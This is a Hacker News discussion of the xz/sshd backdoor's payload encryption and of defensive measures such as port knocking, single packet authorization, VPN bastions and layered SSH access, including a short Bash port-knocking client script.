<https://news.ycombinator.com/user?id=dang> | | --- | --- | --- | | | |  |  | [mkeymaker](user?id=mkeymaker) [9 months ago](item?id=39901829)   | [prev](#39896577) | [next](#39897558) [–]  these things are why focus on assuming compromise should be the default. Stop focusing all the effort on identifying the exploit instead focus on the behaviour of the attacker after exploit. | | --- | --- | --- | | | |  |  | [loeg](user?id=loeg) [9 months ago](item?id=39897558)   | [prev](#39901829) | [next](#39896572) [–]  > The ciphertext is encrypted with chacha20 using the first 32 bytes of the ED448 public key as a symmetric key. As a result, we can decrypt any exploit attempt using the following key: Isn't this wild? Shouldn't the ciphertext be encrypted with an ephemeral symmetric key signed by the privkey? I guess anyone with the public key can still read any payload, so what's the point? | | --- | --- | --- | | | |  |  | [kevincox](user?id=kevincox) [9 months ago](item?id=39899923)   | [parent](#39897558) | [next](#39899601) [–]  Encrypting the payload will allow you to get by more scanners and in general make the traffic harder to notice. Since the publicly available server code needs to be able to decrypt the payload there is no way to make it completely secure, so this seems like a good tradeoff that prevents passive naive monitoring from triggering while not being more complicated than necessary. The only real improvement that I can see being made would be adding perfect forward secrecy so that a logged session couldn't be decrypted after the fact. But that would likely add a lot of complexity (I think you need bidirectional communication?) | | --- | --- | --- | | | |  |  | [loeg](user?id=loeg) [9 months ago](item?id=39900937)   | [root](#39897558) | [parent](#39899923) | [next](#39899601) [–]  Seems like single-byte XOR would be almost as good for obfuscation purposes, but I guess using chacha20 from the public key as a pseudo-OTP doesn't hurt. > The only real improvement that I can see being made would be adding perfect forward secrecy so that a logged session couldn't be decrypted after the fact. But that would likely add a lot of complexity (I think you need bidirectional communication?) Yeah. | | --- | --- | --- | | | |  |  | [thenewwazoo](user?id=thenewwazoo) [9 months ago](item?id=39899601)   | [parent](#39897558) | [prev](#39899923) | [next](#39898142) [–]  This is a NOBUS attack - Nobody But Us. By tying it to a particular key owned by the attacker, no other party can trigger the exploit. | | --- | --- | --- | | | |  |  | [loeg](user?id=loeg) [9 months ago](item?id=39899743)   | [root](#39897558) | [parent](#39899601) | [next](#39898142) [–]  I don't think this is responsive to my comment. | | --- | --- | --- | | | |  |  | [jhugo](user?id=jhugo) [9 months ago](item?id=39900322)   | [root](#39897558) | [parent](#39899743) | [next](#39898142) [–]  I think it is? They were not trying to hide the content, but rather to ensure that nobody else could encrypt valid payloads. | | --- | --- | --- | | | |  |  | [loeg](user?id=loeg) [9 months ago](item?id=39900934)   | [root](#39897558) | [parent](#39900322) | [next](#39898142) [–]  The *signing* accomplishes that. The chacha20 *encryption* with part of a public key, which is what I'm discussing above, is just obfuscation. | | --- | --- | --- | | | |  |  | [rcaught](user?id=rcaught) [9 months ago](item?id=39898142)   | [parent](#39897558) | [prev](#39899601) | [next](#39896572) [–]  That action would create extra noise. | | --- | --- | --- | | | |  |  | [dec0dedab0de](user?id=dec0dedab0de) [9 months ago](item?id=39896572)   | [prev](#39897558) | [next](#39903220) [–]  Stuff like this is why I like port knocking, and limiting access to specific client IPs/networks when possible. 20 years ago, I was working at an ISP/Telco and one of our vendors had a permanent admin account hardcoded on their gear, you couldn't change the password and it didn't log access, or show up as an active user session. Always limit traffic to just what is necessary, does the entire internet really need to be able to SSH to your box? | | --- | --- | --- | | | |  |  | [herpderperator](user?id=herpderperator) [9 months ago](item?id=39896606)   | [parent](#39896572) | [next](#39898061) [–]  The thing about port knocking is that if you're on a host where you don't have the ability to port-knock, then you're not able to connect. This can turn into a footgun: you're away from your usual device, something happens and you desperately need to connect, but now you can't because all the devices in your vicinity don't have the ability to perform $SECURITY\_FEATURE\_X so that you can connect, and you're screaming at yourself for adding so much security at the expense of convenience. This could happen as easily as restricting logins to SSH keys only, and not being able to use your SSH key on whatever host you have available at the time, wishing you'd have enabled password authentication. | | --- | --- | --- | | | |  |  | [jolmg](user?id=jolmg) [9 months ago](item?id=39896782)   | [root](#39896572) | [parent](#39896606) | [next](#39897169) [–]  > The thing about port knocking is that if you're on a host where you don't have the ability to port-knock, then you're not able to connect. If that's important, one should be able to set up port knocking such that you're able to do the knocks even by changing the port in a sequence by hand on e.g. a web browser address bar. | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [9 months ago](item?id=39897082)   | [root](#39896572) | [parent](#39896782) | [next](#39897169) [–]  Note that port knocking is vulnerable to replay attacks. Single Packet Authentication is better, but requires a private key (can be your SSH key). <https://www.cipherdyne.org/fwknop/> | | --- | --- | --- | | | |  |  | [mlyle](user?id=mlyle) [9 months ago](item?id=39897945)   | [root](#39896572) | [parent](#39897082) | [next](#39897229) [–]  Naive knocking isn't good as a primary security mechanism, but it lowers your attack surface and adds defense in depth. It means that people who can't intercept traffic can't talk to the ssh server-- and that's most attackers at the beginning phases of an attack. And even someone who can intercept traffic needs to wait for actual administrative activity. | | --- | --- | --- | | | |  |  | [gnramires](user?id=gnramires) [9 months ago](item?id=39898894)   | [root](#39896572) | [parent](#39897945) | [next](#39897229) [–]  Defense in depth has value I agree, but I think it can also be counterproductive in some cases. Every layer can also be buggy and have vulnerabilities, which can often leak (e.g. into code execution) and compromise the whole system (bypassing layers). What happened in this case seems to be a case of maintained hijacking and introducing vulnerabilities. Adding an additional dependency (of say a port-knocking library) doesn't look great in that regard, if the dependency can be hijacked to add remote code execution capabilities. And that library is likely a lot less scrutinized than OpenSSH! Also underrated I think is security by simplicity. OpenSSH should be extremely simple and easy to understand, such that every proposal and change could be easily scrutinized. Cryptographic constructions themselves are almost mathematically proven invulnerable, then a small codebase can go most of the way to mathematically provable security (bonus points for formal verification). But for this kind of system there's usually some kind of human vulnerability (e.g. system updates for your distro) in the loop such that the community needs to remain watchful. (It's fun to consider an application that's proven correct and doesn't need updating every again, but usually that's not practical) | | --- | --- | --- | | | |  |  | [mlyle](user?id=mlyle) [9 months ago](item?id=39899429)   | [root](#39896572) | [parent](#39898894) | [next](#39897229) [–]  > Adding an additional dependency (of say a port-knocking library) doesn't look great in that regard, if the dependency can be hijacked to add remote code execution capabilities. Port knocking infrastructure can be *minimal*, knowing nothing but addresses knocking. It can also be completely outside the protected service on a gateway. Indeed, it can even be no-code, e.g. [https://www.digitalocean.com/community/tutorials/how-to-conf...](https://www.digitalocean.com/community/tutorials/how-to-configure-port-knocking-using-only-iptables-on-an-ubuntu-vps) > OpenSSH should be extremely simple and easy to understand, such that every proposal and change could be easily scrutinized. But OpenSSH intrinsically is going to have a much larger attack surface. > then a small codebase can go most of the way to mathematically provable security (bonus points for formal verification). It's worth noting this would not have helped against this attack: \* It was against another dependency, not openssh \* The actual vulnerability didn't occur in the code you'd inspect as part of verification processes today. (I don't think anyone is formally verifying build process). | | --- | --- | --- | | | |  |  | [gnramires](user?id=gnramires) [9 months ago](item?id=39900561)   | [root](#39896572) | [parent](#39899429) | [next](#39897229) [–]  Good points, I would say that defense in depth is useful when the layers of defense need to all be broken (more or less) independently for a successful attack (this fails only if you add layers that expose vulnerabities compromising your system). E.g. usually a sandbox satisfies this criterion. Also, whenever some layers may allow compromising everything, the supply chains of the layers should be minimal or correlated (same supplier), to avoid increasing such supply chain risks. | | --- | --- | --- | | | |  |  | [ulrikrasmussen](user?id=ulrikrasmussen) [9 months ago](item?id=39897229)   | [root](#39896572) | [parent](#39897082) | [prev](#39897945) | [next](#39897110) [–]  What if the knocking sequence was derived from a TOTP secret? | | --- | --- | --- | | | |  |  | [deepbreath](user?id=deepbreath) [9 months ago](item?id=39898717)   | [root](#39896572) | [parent](#39897229) | [next](#39897922) [–]  Don't have to do anything too complicated. Here's the knocker code in a short Bash script, produced by GPT4: ~ % gpt4 'write a very short bash script that takes the number stored in ~/.ssh/knock\_seq, increments it by 1 and saves it to the file. It then takes the new number and concatenates it with the value stored in the file ~/.ssh/secret. It pipes the resulting string to sha1sum, spitting out binary. It then takes both the resulting sha1sum and the number used and pipes their concatenation to "nc -u $host $(cat ~/.ssh/knocking\_port)". be brief' ```   knock_seq=$(cat ~/.ssh/knock_seq)   let knock_seq++   echo $knock_seq > ~/.ssh/knock_seq   concat_seq_secret=$(echo -n "${knock_seq}$(cat ~/.ssh/secret)")   sha1_output=$(echo -n $concat_seq_secret | sha1sum -b | awk '{print $1}')   final_output="${sha1_output}${knock_seq}"   host=localhost   knocking_port=$(cat ~/.ssh/knocking_port)   echo -n $final_output | nc -u $host $knocking_port ``` | | --- | --- | --- | | | |  |  | [deepbreath](user?id=deepbreath) [9 months ago](item?id=39898912)   | [root](#39896572) | [parent](#39898717) | [next](#39897922) [–]  The knockee PoC should also be straightforward, can use socat + udp-listen + fork with a script that checks that input matches `sha1sum(secret||num)||num` and `num>previously\_seen\_num`, and if so, adds an iptables rule. This should prevent against replays. Throw in some rate limits somewhere maybe to not get DDoSed, especially if you let socat `fork`. | | --- | --- | --- | | | |  |  | [discite](user?id=discite) [9 months ago](item?id=39897922)   | [root](#39896572) | [parent](#39897229) | [prev](#39898717) | [next](#39897292) [–]  Definitely some fun project to try | | --- | --- | --- | | | |  |  | [swsieber](user?id=swsieber) [9 months ago](item?id=39897292)   | [root](#39896572) | [parent](#39897229) | [prev](#39897922) | [next](#39897110) [–]  Ooo, that's a fun idea | | --- | --- | --- | | | |  |  | [jolmg](user?id=jolmg) [9 months ago](item?id=39897110)   | [root](#39896572) | [parent](#39897082) | [prev](#39897229) | [next](#39897450) [–]  Not if you set it up such that each knocking sequence can only be used once. Port knocking is a flexible concept. | | --- | --- | --- | | | |  |  | [squigz](user?id=squigz) [9 months ago](item?id=39897155)   | [root](#39896572) | [parent](#39897110) | [next](#39897450) [–]  I wonder if one could combine port knocking and TOTP in some way, so the sequence is determined by the TOTP? (Security is not my thing; don't judge me!) | | --- | --- | --- | | | |  |  | [noman-land](user?id=noman-land) [9 months ago](item?id=39897237)   | [root](#39896572) | [parent](#39897155) | [next](#39897788) [–]  Was just having the same thought reading this thread. | | --- | --- | --- | | | |  |  | [ametrau](user?id=ametrau) [9 months ago](item?id=39897788)   | [root](#39896572) | [parent](#39897155) | [prev](#39897237) | [next](#39897450) [–]  Yeah you could but wouldn’t it defeat the purpose of being basically a secret knock before you can give the password? The password should be the ssh password. | | --- | --- | --- | | | |  |  | [cesnja](user?id=cesnja) [9 months ago](item?id=39897998)   | [root](#39896572) | [parent](#39897788) | [next](#39897450) [–]  This would be just to allow you to connect to the server. If there was a vulnerable sshd on port 22, an adversary would have to know the port knocking sequence to connect to sshd and run the exploit. | | --- | --- | --- | | | |  |  | [vikarti](user?id=vikarti) [9 months ago](item?id=39897450)   | [root](#39896572) | [parent](#39897082) | [prev](#39897110) | [next](#39897169) [–]  This looks related to some other problem: - There is Alice's server which provide service X - There are clients like Bob who needs this service. - There is Mallory who thinks clients doesn't need such service. Mallory have significant resources (more than Alice or Bob). - Mallory thinks it's ok to block access to Alice' server IF it's known that it's Alice's server and not some random site. Mallory sometimes also thinks it's ok to block if protocol is unknown. This problem solved by XRay in all of it's versions. It could be possible (if overkill) to use mostly same methods to authenticate correct user and provide eir access. | | --- | --- | --- | | | |  |  | [mlyle](user?id=mlyle) [9 months ago](item?id=39897169)   | [root](#39896572) | [parent](#39896606) | [prev](#39896782) | [next](#39896780) [–]  > The thing about port knocking is that if you're on a host where you don't have the ability to port-knock, then you're not able to connect. You can type <http://hostname:porttoknock> in a browser. As long as you're not behind a super restrictive gateway that doesn't let you connect to arbitrary ports, you're golden. | | --- | --- | --- | | | |  |  | [Dwedit](user?id=Dwedit) [9 months ago](item?id=39897364)   | [root](#39896572) | [parent](#39897169) | [next](#39897403) [–]  I've actually been behind a firewall that blocked outgoing connections except on several well-known ports. Had to run my SSH server over the port usually used for HTTPS just to get it unblocked. | | --- | --- | --- | | | |  |  | [AlexCoventry](user?id=AlexCoventry) [9 months ago](item?id=39897403)   | [root](#39896572) | [parent](#39897169) | [prev](#39897364) | [next](#39899772) [–]  Some versions of port knocking require a specific type of packet. <https://github.com/moxie0/knockknock> | | --- | --- | --- | | | |  |  | [toast0](user?id=toast0) [9 months ago](item?id=39899772)   | [root](#39896572) | [parent](#39897169) | [prev](#39897403) | [next](#39897226) [–]  Likely won't be enough if you're behind CGNAT and you get a different public IP on different connections. | | --- | --- | --- | | | |  |  | [mlyle](user?id=mlyle) [9 months ago](item?id=39901324)   | [root](#39896572) | [parent](#39899772) | [next](#39897226) [–]  Most decent CGNAT will give you the same source IP when you connect to the same dest IP repeatedly. | | --- | --- | --- | | | |  |  | [bee\_rider](user?id=bee_rider) [9 months ago](item?id=39897226)   | [root](#39896572) | [parent](#39897169) | [prev](#39899772) | [next](#39897228) [–]  It seems like there’d be a pretty big overlap between those kinds of hosts. | | --- | --- | --- | | | |  |  | [noman-land](user?id=noman-land) [9 months ago](item?id=39897228)   | [root](#39896572) | [parent](#39897169) | [prev](#39897226) | [next](#39897205) [–]  I'm a bit of a noob about this. Can you explain what this means? | | --- | --- | --- | | | |  |  | [shanemhansen](user?id=shanemhansen) [9 months ago](item?id=39897341)   | [root](#39896572) | [parent](#39897228) | [next](#39897205) [–]  Port knocking involves sending a packet to certain ports on a host. It's overkill but typing <http://host:port/> in your browser will, as part of trying to make a TCP connection, send a packet to that port. | | --- | --- | --- | | | |  |  | [noman-land](user?id=noman-land) [9 months ago](item?id=39897920)   | [root](#39896572) | [parent](#39897341) | [next](#39897205) [–]  Thanks, I didn't realize port knocking could be done manually like this as a way to "unlock" an eventual regular ssh attempt outside the browser. This makes sense now and is super clever! | | --- | --- | --- | | | |  |  | [webmaven](user?id=webmaven) [9 months ago](item?id=39897205)   | [root](#39896572) | [parent](#39897169) | [prev](#39897228) | [next](#39896780) [–]  TIL another interesting browser feature. Thank you. | | --- | --- | --- | | | |  |  | [Dwedit](user?id=Dwedit) [9 months ago](item?id=39897381)   | [root](#39896572) | [parent](#39897205) | [next](#39896780) [–]  That's just the usual way of attempting to connect to an HTTP server running on a different port. Sometimes you see websites hosted on port 8080 or something like that. | | --- | --- | --- | | | |  |  | [webmaven](user?id=webmaven) [9 months ago](item?id=39897526)   | [root](#39896572) | [parent](#39897381) | [next](#39896780) [–]  Oh. Duh. I suppose I should have said it was a new-to-me use case for that feature. | | --- | --- | --- | | | |  |  | [dec0dedab0de](user?id=dec0dedab0de) [9 months ago](item?id=39896780)   | [root](#39896572) | [parent](#39896606) | [prev](#39897169) | [next](#39898228) [–]  Absolutely, everything in security is a tradeoff. I guess the real point is that there should be layers, and even though you should never rely on security through obscurity, you should still probably have a bit of obscurity in the mix. | | --- | --- | --- | | | |  |  | [GabeIsko](user?id=GabeIsko) [9 months ago](item?id=39898228)   | [root](#39896572) | [parent](#39896606) | [prev](#39896780) | [next](#39896693) [–]  I wouldn't really consider port knocking to be that effective of a way to block connections. It is really only obscure, but port knocking software is very accessible. So if you know a port needs to be knocked, it's not hard for an attacker to get to it. The main benefit of port knocking is that it allows you to present your ports as normally closed. If you have a system and you are worried about it getting port scanned for whatever reason, it makes sense to have a scheme where the ports are closed unless it receives a knock. So if someone gets access they shouldn't for whatever reason and pulls a portscan off, the information they get about your system is somewhat limited. In this scheme, it would be much better to have an access point you authenticate with and then that handles the port knocking for the other devices. So it is a kind of obscure method that is really only useful in a specific use case. As far as SSH keys go, I would argue that SSH support is so ubiquitous, and SSH access is so powerful that it is a reasonable security tradeoff. I also don't think that SSH ports should be exposed to the internet, unless it is a specific use case where that is the whole point, like GitHub. I'm very down on connecting directly through SSH without network access. The xz situation has validated this opinion. I personally don't know any application where you really need supreme admin access to every device, from any device, from anywhere in the world, while at the same time it has extreme security requirements. That's a pretty big task. At that point, constructing a dedicated, hardened access point that faces the internet and grants access to other devices is probably the way to go. | | --- | --- | --- | | | |  |  | [delusional](user?id=delusional) [9 months ago](item?id=39898444)   | [root](#39896572) | [parent](#39898228) | [next](#39896693) [–]  > I'm very down on connecting directly through SSH without network access. The xz situation has validated this opinion. Did it? At the point an attacker has remote code execution, couldn't they just as easily pivot into an outgoing connection to some command and control server? I don't see how some intermediary access point would have alleviated this problem. If the call is coming from inside the house, the gig is already up. | | --- | --- | --- | | | |  |  | [deepbreath](user?id=deepbreath) [9 months ago](item?id=39898534)   | [root](#39896572) | [parent](#39898444) | [next](#39896693) [–]  > At the point an attacker has remote code execution The attacker doesn't have remote code execution in the xz case unless they can speak to your port 22. Port knocking prevents them from doing so, provided they don't know how to knock. | | --- | --- | --- | | | |  |  | [delusional](user?id=delusional) [9 months ago](item?id=39909702)   | [root](#39896572) | [parent](#39898534) | [next](#39896693) [–]  Assuming they have injected code into the sshd executable, couldn't that code just do the exploit without a connection? What I'm saying is that the structure of this payload is the way it is because sshd is accessible. Had it not been accessible, the payload just wouldn't have required an external connection. | | --- | --- | --- | | | |  |  | [GabeIsko](user?id=GabeIsko) [9 months ago](item?id=39921640)   | [root](#39896572) | [parent](#39909702) | [next](#39896693) [–]  I mean, this is the twisting logic. xy hack put's a backdoor in sshd. You need to access sshd port to go through the back door and get RCE. Hacker could have put something even more nefarious that could phone home somewhere. We would like to think that would have been a little easier to spot, but who knows. To me, that is what makes this hack so noteworthy. Hacker got access, and then kept playing the long game. Very spooky. And yes, someone capable of this probably has a plan for gaining network access if they had a target in mind. Even with best security practice, this rabbit hole goes pretty deep. | | --- | --- | --- | | | |  |  | [Joel\_Mckay](user?id=Joel_Mckay) [9 months ago](item?id=39896693)   | [root](#39896572) | [parent](#39896606) | [prev](#39898228) | [next](#39896818) [–]  Port knocking with ssh over https using client certs. And port knocking is one of the few effective methods against the standard distributed brute forcing slow attacks. Note if you blanket-ban IN/RU/UK/CN/HK/TW/IR/MX/BZ/BA + tor/proxies lists, than 99.998% of your nuisance traffic issues disappear overnight. =) | | --- | --- | --- | | | |  |  | [oarsinsync](user?id=oarsinsync) [9 months ago](item?id=39897473)   | [root](#39896572) | [parent](#39896693) | [next](#39896781) [–]  > if you blanket-ban IN/RU/UK/CN/HK/TW/IR/MX/BZ/BA The list of countries there: India, Russia, United Kingdom, China, Hong Kong, Taiwan, Iran, Mexico, Belize, Bosnia and Herzegovina I’m amused that the UK is in that group. | | --- | --- | --- | | | |  |  | [Joel\_Mckay](user?id=Joel_Mckay) [9 months ago](item?id=39897572)   | [root](#39896572) | [parent](#39897473) | [next](#39896781) [–]  I was too, but the past few years their government server blocks have been pen-testing servers without authorization. It is apparently a free service they offer people even when told to get stuffed. =) My spastic ban-hammer active-response list i.e. the entire block gets temporarily black-holed with a single violation: AU BG BR BZ CN ES EE FR GB HR IL IN ID IR IQ JP KG KR KP KW LV MM MX NI NL PA PE PK PL RO RU RS SE SG TW TH TR YE VN UA ZA ZZ | | --- | --- | --- | | | |  |  | [deknos](user?id=deknos) [9 months ago](item?id=39896781)   | [root](#39896572) | [parent](#39896693) | [prev](#39897473) | [next](#39896818) [–]  can you give an example for an implementation of portnocking/ssh/over https and client certs? | | --- | --- | --- | | | |  |  | [Joel\_Mckay](user?id=Joel_Mckay) [9 months ago](item?id=39897168)   | [root](#39896572) | [parent](#39896781) | [next](#39896818) [–]  In general, it is a standard shore-wall firewall rule in perl, and the standard ssh protocol wrapper mod. These are very well documented tricks, and when combined with a standard port 22 and interleaved knock ports tripwire 5 day ban rules... are quite effective against scanners too. I am currently on the clock, so can't write up a detailed tutorial right now. Best regards, =) | | --- | --- | --- | | | |  |  | [nottorp](user?id=nottorp) [9 months ago](item?id=39896818)   | [root](#39896572) | [parent](#39896606) | [prev](#39896693) | [next](#39898081) [–]  You just described the problem with using keys for any login, like the latest fad is? And generally with depending on a device (phone, xxxkey or whatever) for access. | | --- | --- | --- | | | |  |  | [Dwedit](user?id=Dwedit) [9 months ago](item?id=39897406)   | [root](#39896572) | [parent](#39896818) | [next](#39898081) [–]  At least TOTP is just a long, random, server-assigned password, where you you don't type the whole thing into during login attempts. You can write down the full TOTP secret, and make new 'TOTP keys' whenever you want. Suggested apps: Firefox Extension named "TOTP", and Android App named "Secur". You don't need the heavier apps that want you to create accounts with their company. Using a TOTP key only provides a little more protection than any other complex password, since you're not typing in the whole thing during a login attempt. | | --- | --- | --- | | | |  |  | [godman\_8](user?id=godman_8) [9 months ago](item?id=39898081)   | [root](#39896572) | [parent](#39896606) | [prev](#39896818) | [next](#39897025) [–]  My solution to this has been creating a public bastion server and use Wireguard. Wireguard listens on a random UDP port (port knocking is more difficult here.) This client is set up to have a dynamic endpoint so I don't need to worry about whitelisting. The key and port information are stored in a password manager like Vaultwarden with the appropriate documentation to connect. Firewall rules are set to reject on all other ports and it doesn't respond to ICMP packets either. A lot of that is security through obscurity but I found this to be a good balance of security and practicality. | | --- | --- | --- | | | |  |  | [trelane](user?id=trelane) [9 months ago](item?id=39898562)   | [root](#39896572) | [parent](#39898081) | [next](#39897025) [–]  I've seen this discussed a fair bit, and always the recommendation is to use wire guard and expose ssh only to the "local network" e.g. <https://bugs.gentoo.org/928134#c38> First, I don't see how this works where there's a single server (e.g. colocation). Second, doesn't that just make Wireguard the new hack target? How does this actually mitigate the risk? | | --- | --- | --- | | | |  |  | [tamimio](user?id=tamimio) [9 months ago](item?id=39897025)   | [root](#39896572) | [parent](#39896606) | [prev](#39898081) | [next](#39897577) [–]  > The thing about port knocking is that if you're on a host where you don't have the ability to port-knock, then you're not able to connect. Then you attach a device that can have port knocking to that unsupported host. Also, I remember it was called port punching not knocking. | | --- | --- | --- | | | |  |  | [codedokode](user?id=codedokode) [9 months ago](item?id=39897577)   | [root](#39896572) | [parent](#39896606) | [prev](#39897025) | [next](#39896636) [–]  You can as well find yourself on a host that doesn't have SSH or network that filters SSH traffic for security reasons. | | --- | --- | --- | | | |  |  | [pajko](user?id=pajko) [9 months ago](item?id=39896636)   | [root](#39896572) | [parent](#39896606) | [prev](#39897577) | [next](#39898061) [–]  <https://github.com/CERN-CERT/pam_2fa> | | --- | --- | --- | | | |  |  | [herpderperator](user?id=herpderperator) [9 months ago](item?id=39896648)   | [root](#39896572) | [parent](#39896636) | [next](#39898281) [–]  What does this have to do with port knocking? | | --- | --- | --- | | | |  |  | [nequo](user?id=nequo) [9 months ago](item?id=39898281)   | [root](#39896572) | [parent](#39896636) | [prev](#39896648) | [next](#39898061) [–]  This is great but would this neutralize the xz backdoor? The backdoor circumvents authentication, doesn't it? | | --- | --- | --- | | | |  |  | [teddyh](user?id=teddyh) [9 months ago](item?id=39898061)   | [parent](#39896572) | [prev](#39896606) | [next](#39897086) [–]  Port knocking is stupid. It violates Kerckhoffs’s principle¹. If you want more secret bits which users need to know in order to access your system, increase your password lengths, or cryptographic key sizes. If you want to keep log sizes manageable, adjust your logging levels. The security of port knocking is also woefully inadequate: • It adds *very little* security. How many bits are in a “secret knock”? • The security it *does* add is *bad*: It’s sent in cleartext, and easily brute-forced. • It complicates access, since it’s non-standard. 1. <[https://en.wikipedia.org/w/index.php?title=Kerckhoffs%27s\_pr...](https://en.wikipedia.org/w/index.php?title=Kerckhoffs%27s_principle&oldid=1214547066)> | | --- | --- | --- | | | |  |  | [reaperman](user?id=reaperman) [9 months ago](item?id=39898139)   | [root](#39896572) | [parent](#39898061) | [next](#39898127) [–]  Security-by-obscurity is dumb, yes. But in the context of supply-chain exploits in the theme of this xz backdoor, this statement is also myopic: > *If you want more secret bits which users need to know in order to access your system, increase your password lengths, or cryptographic key sizes.* If your *sshd* (or *any other* exposed service) is backdoored, then the "effective bits" of any cryptographic key size is reduced to nil. You personally cannot know whether or not your exposed service is backdoored. Bottom-line is: adding a defense-in-depth like port knocking is unlikely to cause harm *unless* you use it as justification for not following best-practices in the rest of your security posture. | | --- | --- | --- | | | |  |  | [belorn](user?id=belorn) [9 months ago](item?id=39898334)   | [root](#39896572) | [parent](#39898139) | [next](#39898127) [–]  Chaining multiple different login system can make sense. A more sensible solution over port knocking would be an alternative sshd implementation with a tunnel to the second sshd implementation. Naturally the first one should not run as root (similar to the port knocking daemon). That way it would not be in clear text, and the number of bits of security will be order of magnitude larger even with very simple password. The public facing sshd can also run more lightweight algorithms and disable loggings for lower resource usage. Regardless if one uses two sshd or port knocking software, the public facing daemon can have backdoors and security bugs. If we want to avoid Xz-like problems then this first layer need to be significant hardened (With SELinux as one solution). Their only capability should be to open the second layer. | | --- | --- | --- | | | |  |  | [ufo](user?id=ufo) [9 months ago](item?id=39901489)   | [root](#39896572) | [parent](#39898334) | [next](#39898127) [–]  Chaining login methods would not help if the outermost login method is backdoored with an RCE. | | --- | --- | --- | | | |  |  | [belorn](user?id=belorn) [9 months ago](item?id=39905272)   | [root](#39896572) | [parent](#39901489) | [next](#39898127) [–]  That is where hardened with SELinux comes in. The outermost login method only capability beyond communication in the initial connection should be to open a tunnel to the next level, so any remote code execution could only execute the code to open the tunnel. Building security in depth correctly is not simple. It takes work to construct layers so that one compromised layer do not cause whole system failure. | | --- | --- | --- | | | |  |  | [kelnos](user?id=kelnos) [9 months ago](item?id=39898127)   | [root](#39896572) | [parent](#39898061) | [prev](#39898139) | [next](#39898536) [–]  I don't think I agree. This backdoor means that it doesn't matter how long your key lengths or cryptographic key sizes are; that's kinda the point of a backdoor. But an automated attempt to find servers to exploit is not going to attempt something like port knocking, or likely even looking for a sshd on a non-standard port. Kerckhoff's law goes (from your link): > *The principle holds that a cryptosystem should be secure, even if everything about the system, except the key, is public knowledge.* With this backdoor, that principle does not hold; it's utterly irrelevant. Obscuring the fact that there even is a ssh server to exploit increases safety. (I dislike port knocking because of your third point, that it complicates access. But I don't think your assertions about its security principles hold water, at least not in this case.) (Ultimately, though, instead of something like port knocking or even running sshd on a non-standard port, if I wanted to protect against attacks like these, I would just keep sshd on a private network only accessible via a VPN.) | | --- | --- | --- | | | |  |  | [teddyh](user?id=teddyh) [9 months ago](item?id=39898368)   | [root](#39896572) | [parent](#39898127) | [next](#39898536) [–]  > *This backdoor means that it doesn't matter how long your key lengths or cryptographic key sizes are; that's kinda the point of a backdoor.* If we’re talkning about this specific backdoor, consider this: If the attacker had successfully identified a target SSH server they could reasonably assume had the backdoor, would they be completely halted by a port knocker? No, they would brute-force it easily. Port knocking is very bad security. (It’s “Kerckhoffs’s <law/principle/etc.>”, by the way.) | | --- | --- | --- | | | |  |  | [e\_y\_](user?id=e_y_) [9 months ago](item?id=39898536)   | [root](#39896572) | [parent](#39898061) | [prev](#39898127) | [next](#39898125) [–]  Security through obscurity is only a problem if obscurity is the *main* defense mechanism. It's perfectly fine as a defense-in-depth. This would only be an issue if someone did something stupid like set up a passwordless rlogin or database server expecting port knocking alone to handle security. Also as pointed out elsewhere, modern port knocking uses Single Packet Authorization which allows for more bits. It's also *simpler* and uses a *different* mechanism than ssh (which due to its age, has historically supported a bunch of different login and cryptography techniques), which reduces the chance that an attacker would be able to break both. | | --- | --- | --- | | | |  |  | [VWWHFSfQ](user?id=VWWHFSfQ) [9 months ago](item?id=39898125)   | [root](#39896572) | [parent](#39898061) | [prev](#39898536) | [next](#39897086) [–]  Port knocking is definitely dumb, but "increase your password lengths, or cryptographic key sizes" does nothing if your ssh binary is compromised and anyone can send a magic packet to let themselves in. Strict firewalls, VPNs, and defense-in-depth is really the only answer here. Of course, those things all go out the window too if your TCP stack itself is also compromised. Better to just air-gap. | | --- | --- | --- | | | |  |  | [teddyh](user?id=teddyh) [9 months ago](item?id=39898251)   | [root](#39896572) | [parent](#39898125) | [next](#39897086) [–]  Many people argue that a VPN+SSH is a reasonable solution, since it uses two separate implementations, where both are unlikely to be compromised at the same time. I would argue that the more reasonable option would be to split the SSH project in two; both of which validates the credentials of an incoming connection. This would be the same as a VPN+SSH but would not convolute the network topography, and would eliminate the need for two keys to be used by every connecting user. *However*, in this case, the two-layer approach would not be a protection. Sure, in this case the SSH daemon was compromised, and a VPN before SSH would have protected SSH. But what if the VPN server itself was compromised? Remember that the SSH server was altered, not to allow normal logins, but to call system() directly. What if a VPN server had been similarly altered? This would not have protected SSH, since a direct system() call by the VPN daemon would have ignored SSH completely. It is a mistake to look at this case and assume that since SSH was compromised this time, SSH must always be protected by another layer. That other layer might be the next thing to be compromised. | | --- | --- | --- | | | |  |  | [mikeocool](user?id=mikeocool) [9 months ago](item?id=39898739)   | [root](#39896572) | [parent](#39898251) | [next](#39898392) [–]  Best practice would have your internet exposed daemon (vpn or ssh) running a fairly locked down box that doesn’t also have your valuable “stuff” (whatever that is) on it. So if someone cracks that box, their access is limited, and they still need to make a lateral move to access actual data. In the case of this backdoor, if you have SSH exposed to the internet on a locked down jump box, AND use it as your internal mechanism for accessing your valuable boxes, you are owned, since the attacker can access your jump box and then immediately use the same vulnerability to move to an internal box. In the case of a hypothetical VPN daemon vulnerability, they can use that to crack your jump box, but then still need another vulnerability to move beyond that. Not great, but a lot better than being fully owned. You could certainly also accomplish a similar topology with two different SSH implementations. | | --- | --- | --- | | | |  |  | [teddyh](user?id=teddyh) [9 months ago](item?id=39919339)   | [root](#39896572) | [parent](#39898739) | [next](#39898392) [–]  Sure, but that violates the end-to-end principle. | | --- | --- | --- | | | |  |  | [PhilipRoman](user?id=PhilipRoman) [9 months ago](item?id=39898392)   | [root](#39896572) | [parent](#39898251) | [prev](#39898739) | [next](#39897086) [–]  >This would not have protected SSH, since a direct system() call by the VPN daemon would have ignored SSH completely. I don't know how VPNs are implemented on Linux, but in principle it should be possible to sandbox a VPN server to the point where it can only make connections but nothing else. If capabilities are not enough, ebpf should be able to contain it. I suspect it will have full control over networking but that's still very different from arbitrary code execution. | | --- | --- | --- | | | |  |  | [teddyh](user?id=teddyh) [9 months ago](item?id=39898466)   | [root](#39896572) | [parent](#39898392) | [next](#39897086) [–]  That would be possible, yes, but it’s not the current situation. And since we can choose how we proceed, I would prefer my proposal, i.e. that the SSH daemon be split into two separate projects, one daemon handling the initial connection, locked-down like you describe, then handing off the authenticated connection to the second, “inner”, SSH daemon, which *also does the authentication*, using the same credentials as submitted by the connecting user. This way, the connecting user only has to have one key, and the network topology does not become unduly twisted. | | --- | --- | --- | | 